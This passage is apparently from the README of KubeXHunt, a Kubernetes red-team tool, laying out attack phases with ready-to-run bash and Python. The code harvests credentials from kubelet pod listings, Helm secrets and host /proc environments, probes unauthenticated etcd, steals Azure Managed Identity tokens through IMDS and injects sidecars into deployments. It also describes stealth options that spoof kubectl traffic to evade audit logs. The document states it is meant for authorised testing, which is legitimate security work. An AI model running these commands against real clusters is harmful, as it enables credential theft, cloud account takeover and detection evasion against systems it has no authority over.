
> 🔴 **CRITICAL** — full pod list, env vars, exec capability without credentials

```bash
# Port 10255 — read-only, no auth
for NODE_IP in $(curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/nodes | \
  python3 -c "import sys,json; [print(a['address']) for n in json.load(sys.stdin).get('items',[]) for a in n.get('status',{}).get('addresses',[]) if a['type']=='InternalIP']" 2>/dev/null); do

  echo "━━━ Kubelet @ $NODE_IP ━━━"
  curl -s --max-time 5 http://$NODE_IP:10255/pods 2>/dev/null | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(f'🔴 10255 ANONYMOUS — {len(d.get(\"items\",[]))} pods')" \
    2>/dev/null || echo "✅ 10255 not accessible"

  curl -sk --max-time 5 https://$NODE_IP:10250/pods 2>/dev/null | head -1 | \
    grep -q "items" && echo "🔴 10250 ANONYMOUS ACCESS" || echo "✅ 10250 requires auth"
done
```

---

### 16.2 Harvest Credentials from Kubelet /pods

```bash
# Extract all env var credentials from every pod on the node
curl -s http://$NODE_IP:10255/pods 2>/dev/null | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
cred_kw = ['password','secret','token','api_key','credential']
for pod in d.get('items', [])[:20]:
    for c in pod.get('spec', {}).get('containers', []):
        for env in c.get('env', []):
            if any(kw in env.get('name', '').lower() for kw in cred_kw):
                print(f'🔴 {pod[\"metadata\"][\"name\"]}/{c[\"name\"]}: {env[\"name\"]}={str(env.get(\"value\",\"\"))[:60]}')
"
```

---

## 🗄️ Phase 17: etcd Exposure ⭐

```bash
# Probe each node IP
for NODE_IP in $NODE_IPS; do
  # No TLS
  curl -s --max-time 4 http://$NODE_IP:2379/version 2>/dev/null | grep -q "etcdserver" && \
    echo "🔴 ETCD NO-TLS at $NODE_IP:2379 — DUMP ALL SECRETS" || true

  # HTTPS without client cert
  curl -sk --max-time 4 https://$NODE_IP:2379/version 2>/dev/null | grep -q "etcdserver" && \
    echo "🔴 ETCD HTTPS NO CLIENT CERT at $NODE_IP:2379" || \
    echo "✅ etcd protected at $NODE_IP"
done
```

---

## ⛵ Phase 18: Helm & Application Secrets ⭐

```bash
# Find and decode Helm release secrets (base64 + gzip)
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/secrets | \
  python3 -c "
import sys, json, base64, gzip, re
d = json.load(sys.stdin)
cred_pat = re.compile(r'(?:password|secret|token|apikey)\s*[:=]\s*[\"\'']?([^\s\"\'<>]{6,})', re.I)
for s in d.get('items', []):
    if s.get('type') == 'helm.sh/release.v1':
        raw = s.get('data', {}).get('release', '')
        if raw:
            try:
                raw2 = base64.b64decode(base64.b64decode(raw))
                content = gzip.decompress(raw2).decode(errors='replace')
                matches = cred_pat.findall(content)
                if matches:
                    print(f'🔴 Credentials in Helm release {s[\"metadata\"][\"name\"]}: {matches[:3]}')
            except Exception as e:
                pass
"
```

---

## 🔍 Phase 19: /proc Credential Harvesting ⭐

```bash
# Two-phase scan: pod co-processes first, then host processes via hostPID
# Uses cgroup comparison to distinguish pod PIDs from host PIDs — prevents
# the same credential appearing twice when hostPID is enabled
python3 -c "
import os
cred_kw = ['password','secret','token','api_key','redis','database_url']
skip_kw = ['kubernetes','service_port','service_host','path','home','shell','term']

# Get our cgroup to identify the pod boundary
our_cgroup = open('/proc/self/cgroup').read().split('
')[0].split(':')[-1]
our_pid    = str(os.getpid())
pod_pids   = {our_pid}

print('=== Pod Co-Processes ===')
for pid in os.listdir('/proc'):
    if not pid.isdigit() or pid == our_pid: continue
    try:
        pid_cg = open(f'/proc/{pid}/cgroup').read().split('
')[0].split(':')[-1]
        comm   = open(f'/proc/{pid}/comm').read().strip()
        if pid_cg == our_cgroup:          # same cgroup = same pod
            pod_pids.add(pid)
            for ev in open(f'/proc/{pid}/environ').read().split(''):
                if '=' in ev:
                    k, _, v = ev.partition('=')
                    kl = k.lower()
                    if any(kw in kl for kw in cred_kw) and                        not any(sk in kl for sk in skip_kw) and v:
                        print(f'🔴 PID {pid} ({comm}): {k}={v[:60]}')
    except: pass

# Host processes — only if hostPID is enabled (PID 1 = systemd/init)
pid1 = open('/proc/1/comm').read().strip()
if pid1 in ('systemd','init'):
    print('
=== Host Processes (hostPID) ===')
    host_kw = ['kube','etcd','containerd','docker']
    for pid in os.listdir('/proc'):
        if not pid.isdigit() or pid in pod_pids: continue  # skip pod's own PIDs
        try:
            comm    = open(f'/proc/{pid}/comm').read().strip()
            cmdline = open(f'/proc/{pid}/cmdline').read().replace('',' ')
            if any(kw in comm.lower() or kw in cmdline.lower() for kw in host_kw):
                print(f'Host process: PID {pid} ({comm})')
                for ev in open(f'/proc/{pid}/environ').read().split(''):
                    if '=' in ev:
                        k, _, v = ev.partition('=')
                        kl = k.lower()
                        if any(kw in kl for kw in cred_kw) and                            not any(sk in kl for sk in skip_kw) and v:
                            print(f'  🔴 {k}={v[:60]}')
        except: pass
"
```

---

## ☁️ Phase 20: Azure AKS ⭐

```bash
# Azure IMDS
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | python3 -m json.tool

# Managed Identity token theft
for resource in "https://management.azure.com/" "https://storage.azure.com/" "https://vault.azure.net/"; do
  curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$resource" \
    2>/dev/null | python3 -c "
import sys, json
d = json.load(sys.stdin)
if 'access_token' in d:
    print(f'🔴 Managed Identity token for $resource — type: {d.get(\"token_type\")} | expires: {d.get(\"expires_in\")}s')
" 2>/dev/null
done

# Service Principal credentials
cat /etc/kubernetes/azure.json 2>/dev/null | python3 -c "
import sys, json
d = json.load(sys.stdin)
secret = d.get('aadClientSecret','') or d.get('clientSecret','')
if secret:
    print(f'🔴 SP Credentials: clientId={d.get(\"aadClientId\",\"\")} secret={secret[:8]}...')
" 2>/dev/null
```

---

## 🔧 Phase 21: OpenShift / OKD ⭐

```bash
# SCC enumeration
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/apis/security.openshift.io/v1/securitycontextconstraints | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
dangerous = ['anyuid','privileged','hostmount-anyuid','hostaccess']
for s in d.get('items', []):
    name = s['metadata']['name']
    icon = '🔴' if name in dangerous else '🔵'
    print(f'{icon} SCC: {name}')
" 2>/dev/null

# OpenShift Routes
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/apis/route.openshift.io/v1/routes | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for r in d.get('items', []):
    host = r.get('spec',{}).get('host','')
    print(f'  → {host}')
" 2>/dev/null
```

---

## ⚔ Phase 22: Advanced Red Team Techniques ⭐

### 22.1 SA Token Audience Abuse

```bash
# Decode current token — check audience claim
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
python3 -c "
import base64, json, sys
parts = '$TOKEN'.split('.')
if len(parts) >= 2:
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    aud = payload.get('aud', [])
    iss = payload.get('iss', '')
    exp = payload.get('exp', 0)
    print(f'aud: {aud}')
    print(f'iss: {iss}')
    print(f'No audience → token replay risk' if not aud else '✅ Audience scoped')
"
```

---

### 22.2 Controller Hijacking (Sidecar Injection)

```bash
# Patch existing deployment to inject malicious sidecar
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json-patch+json" -X PATCH \
  $API/apis/apps/v1/namespaces/$NS/deployments/<DEPLOYMENT-NAME> \
  -d '[{
    "op": "add",
    "path": "/spec/template/spec/containers/-",
    "value": {
      "name": "assessment-sidecar",
      "image": "alpine",
      "command": ["sleep","3600"]
    }
  }]' | python3 -m json.tool
```

---

## 🔗 Phase 23: Real-World Attack Chain Simulation ⭐

KubeXHunt automatically validates all four chains based on findings from previous phases.

| Chain | CRITICAL if... |
|-------|----------------|
| Pod → IMDS → Cloud Account | SA token present AND cloud IMDS reachable |
| RBAC → Privileged Pod → Node Root | Can list secrets AND can create privileged pods |
| Token Theft → Wildcard RBAC → Cluster Admin | Stolen tokens found AND one has wildcard RBAC |
| Webhook Bypass → Node Escape | failurePolicy=Ignore AND webhook service unreachable |

---

## 🕵️ Phase 24: Stealth & Evasion Analysis ⭐

```bash
# Run with maximum stealth — blends into normal kubectl traffic
python3 kubexhunt.py --stealth 2 --no-mutate

# What stealth level 2 does:
# - User-Agent: kubectl/v1.29.0 (linux/amd64) kubernetes/v1.29.0
# - Timing jitter: 0.5–3.5s between API calls
# - Read-only: all capabilities inferred from RBAC, no test resources created
# - Batched: parallel checks minimized
# - Result: zero mutating audit log entries, traffic looks like normal kubectl usage

# Verify --no-mutate produces PASS (not HIGH) for the mutating API calls finding
python3 kubexhunt.py --no-mutate --phase 24 --no-color 2>/dev/null | grep -A2 "Mutating API"
# Expected: ✅ PASS  Mutating API calls skipped (--no-mutate active)
#           Zero write operations in audit log

# Verify stealth level is reflected correctly
python3 kubexhunt.py --stealth 1 --phase 24 --no-color 2>/dev/null | grep -A2 "Stealth"
# Expected: ✅ PASS  Stealth level 1 active
#           kubectl User-Agent spoofing | Timing jitter (0.3–2s)
```

---

## 🌐 Phase 25: Network Plugin & Misc ⭐

```bash
# Detect CNI
for cni_path in /etc/cni/net.d/10-calico.conflist /etc/cni/net.d/05-cilium.conf \
                /etc/cni/net.d/10-weave.conf /etc/cni/net.d/10-flannel.conf; do
  [ -f "$cni_path" ] && echo "CNI: $(basename $cni_path | sed 's/[0-9]*-//;s/\..*$//')"
done

# Cluster-wide automount audit
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/pods | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
over_mounted = [f'{p[\"metadata\"][\"namespace\"]}/{p[\"metadata\"][\"name\"]}' for p in d.get('items',[])
                if p.get('spec',{}).get('automountServiceAccountToken') != False]
print(f'🟡 {len(over_mounted)} pods auto-mount SA tokens (should be explicit False)')
"
```

---

## 🔄 Phase 26: Diff & CI/CD Reporting ⭐

```bash
# Generate baseline
python3 kubexhunt.py --output baseline.json

# After infrastructure change — compare
python3 kubexhunt.py --diff baseline.json --output rescan.json
# Exits code 1 if new CRITICAL or HIGH found

# In CI/CD pipeline (GitLab/GitHub Actions example)
python3 kubexhunt.py \
  --stealth 2 \
  --no-mutate \
  --diff previous-scan.json \
  --output "$CI_JOB_NAME-$(date +%Y%m%d).json" || exit 1
```

---

## 📝 Findings Summary Template

```markdown
## Finding: [Title]

**Severity:** 🔴 Critical / 🟠 High / 🟡 Medium / 🔵 Low
**Category:** Cloud Credentials | RBAC | Container Escape | Lateral Movement | Runtime | Supply Chain

**Evidence:**
\`\`\`
<paste command output here>
\`\`\`

**Impact:**
<What can an attacker achieve with this finding>

**Steps to Reproduce:**
1. Starting from compromised pod in namespace `<ns>`
2. Run: `<command>`
3. Observe: `<output>`

**Remediation:**
- [ ] <specific fix>
- [ ] <specific fix>

**References:**
- MITRE ATT&CK: [T1552.007](https://attack.mitre.org/techniques/T1552/007/) Container Credentials
```

---

## 📊 Severity Matrix

| Finding | Severity | Immediate Impact |
|---|---|---|
| IMDS accessible + IAM credentials stolen | 🔴 Critical | AWS/GCP/Azure account takeover |
| etcd accessible without auth | 🔴 Critical | All cluster secrets in plaintext |
| Privileged pod + hostPath mount | 🔴 Critical | Full node + cluster compromise |
| aws-auth / ClusterRoleBinding writable | 🔴 Critical | Permanent cluster-admin |
| Kubelet 10255/10250 anonymous access | 🔴 Critical | All pod credentials harvested |
| Attack chain simulation — any complete chain | 🔴 Critical | End-to-end cluster or cloud compromise |
| Wildcard RBAC on service account | 🟠 High | All secrets in cluster readable |
| Other pods' SA tokens readable via hostPath | 🟠 High | Lateral movement to any workload |
| Kubelet certificate accessible | 🟠 High | system:node credential |
| Helm release secrets with embedded credentials | 🟠 High | Application credentials exposed |
| Unsigned images allowed in admission | 🟠 High | Supply chain backdoor vector |
| failurePolicy: Ignore on Kyverno webhook | 🟠 High | All admission policies bypassable |
| Azure Managed Identity / SP credentials | 🟠 High | Azure subscription access |
| OpenShift anyuid/privileged SCC | 🟠 High | Container escape equivalent |
| No mTLS between services | 🟡 Medium | Traffic sniffing, PII exposure |
| No Tetragon/Falco runtime security | 🟡 Medium | Reverse shells, crypto mining go undetected |
| Flat network (no NetworkPolicy) | 🟡 Medium | Unrestricted lateral movement |
| PSS not enforced on namespace | 🟡 Medium | Container escape vector open |
| cluster-wide automountServiceAccountToken | 🟡 Medium | Every pod a K8s API auth point |
| API server on public IP | 🔴 Critical | Internet-exposed K8s API — brute-force / CVE exploitation risk |
| Worker nodes with public IPs | 🟠 High | Kubelet 10250 / NodePort services exposed to internet |
| Registry credential catalog pivot | 🟠 High | Pull/push private images — supply chain backdoor possible |
| Missing resource limits | 🔵 Low | Node DoS / noisy neighbour |
| No audit logging | 🔵 Low | No forensic trail for incidents |

---

## ☁️ EKS vs GKE vs Azure vs OpenShift

| Check | EKS | GKE | Azure AKS | OpenShift |
|---|---|---|---|---|
| **Metadata endpoint** | `169.254.169.254` | `metadata.google.internal` | `169.254.169.254` | N/A |
| **Node IAM** | EC2 instance role | GCE service account | Managed Identity / SP | N/A |
| **K8s auth mapping** | aws-auth ConfigMap | GKE IAM → K8s RBAC | AAD → K8s RBAC | OAuth + SCC |
| **Pod-level cloud auth** | IRSA | Workload Identity | Workload Identity / AAD Pod Identity | N/A |
| **Audit logs** | CloudWatch | Cloud Logging | Azure Monitor | OpenShift Audit |
| **Default CNI** | Amazon VPC CNI | Cilium | Azure CNI | OVN-Kubernetes |
| **Container policy** | PSS + Kyverno | PSS + Binary Auth | PSS + Azure Policy | SCC (SecurityContextConstraints) |
| **etcd access** | Fully managed | Fully managed | Fully managed | Managed (self-hosted possible) |
| **Legacy metadata** | IMDSv1 (disable explicitly) | v1beta1 (off since GKE 1.21) | — | N/A |
| **Unique attack surface** | aws-auth write | cloud-platform scope | azure.json / SP creds | anyuid SCC assignment |


---

## 🎯 Use Cases

- 🔴 **Red Team / Pentesting**  
  Simulate real attacker behavior inside compromised pods

- 🔵 **Blue Team / Detection Engineering**  
  Validate detection coverage and audit logging

- 🟢 **DevSecOps / Platform Teams**  
  Identify real-world impact of misconfigurations

- 🟣 **CI/CD Security Gates**  
  Fail builds on newly introduced critical risks


<div align="center">

---

*All test cases require written authorisation before execution.*
*Document every command run, every output captured, and all cleanup actions taken.*

[![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK%20Containers-red?style=flat-square)](https://attack.mitre.org/matrices/enterprise/containers/)
[![License](https://img.shields.io/badge/Use-Authorised%20Testing%20Only-orange?style=flat-square)](.)
[![Version](https://img.shields.io/badge/KubeXHunt-v1.2.0-purple?style=flat-square)](.)

</div>
